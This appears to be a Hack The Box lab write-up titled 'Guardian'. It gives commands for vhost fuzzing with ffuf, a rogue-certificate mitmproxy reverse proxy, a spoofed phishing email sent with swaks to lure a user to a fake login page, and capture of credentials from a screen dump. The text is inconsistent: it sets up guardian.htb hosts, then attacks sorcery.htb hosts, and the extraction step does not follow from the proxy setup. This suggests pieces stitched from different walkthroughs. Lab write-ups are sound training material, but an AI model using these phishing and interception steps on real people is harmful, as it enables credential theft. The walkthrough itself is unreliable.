---
layout: default
title: Guardian
platform: Hack The Box
---

Add the IPs to `/etc/hosts`:

<pre><code><span style="color:#ffffff">10.10.11.84 guardian.htb
10.10.11.84 portal.guardian.htb
10.10.11.84 gitea.guardian.htb
</span></code></pre>

Visit [https://guardian.htb](https://guardian.htb) and enumerate the repository:

<pre><code><span style="color:#00ff00">git</span><span style="color:#ffffff"> clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git</span></code></pre>

Enumerate virtual hosts with `ffuf`:

<pre><code><span style="color:#00ff00">ffuf</span><span style="color:#ffffff"> -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://sorcery.htb -H </span><span style="color:#ffd700">"Host: FUZZ.sorcery.htb"</span><span style="color:#ffffff"> -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://sorcery.htb
 :: Wordlist         : FUZZ: /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.sorcery.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [28/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: :: Progress: [40/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: :: Progress: [80/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: :: Progress: [162/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :::: Progress: [246/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :::: Progress: [325/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] ::==git                     [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 123ms]==
:: Progress: [340/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :::: Progress: [410/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :::: Progress: [490/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] ::

</span></code></pre>



This reveals `git.sorcery.htb`; add it to `/etc/hosts` and create an account on the site, then log in.

Capture traffic with a rogue host and `mitmproxy`:

<pre><code><span style="color:#00ff00">sudo</span><span style="color:#ffffff"> </span><span style="color:#00ff00">mitmproxy</span><span style="color:#ffffff"> --mode reverse:https://git.sorcery.htb --certs pwn.sorcery.htb.pem -k -p 443</span></code></pre>

Send a phishing email to capture credentials:

<pre><code><span style="color:#00ff00">proxychains4</span><span style="color:#ffffff"> -f /etc/proxychains4.conf </span><span style="color:#00ff00">swaks</span><span style="color:#ffffff"> --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data </span><span style="color:#ffd700">"Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"</span></code></pre>

Extract the captured credentials from the proxied session:

<pre><code><span style="color:#00ff00">magick</span><span style="color:#ffffff"> xwd:Xvfb_screen0 credentials.png
</span><span style="color:#00ff00">open</span><span style="color:#ffffff"> credentials.png</span></code></pre>

*Screenshots omitted.*
